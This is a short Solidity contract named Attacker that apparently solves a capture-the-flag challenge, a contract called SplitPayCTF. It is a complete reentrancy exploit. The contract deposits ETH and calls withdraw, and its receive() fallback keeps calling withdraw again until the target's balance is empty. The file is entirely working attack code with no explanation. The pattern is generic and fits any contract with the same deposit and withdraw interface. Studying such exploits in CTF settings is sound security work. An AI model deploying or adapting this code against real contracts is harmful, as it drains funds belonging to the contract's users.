// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISplitPayCTF {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    ISplitPayCTF public target;

    constructor(address _target) {
        target = ISplitPayCTF(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}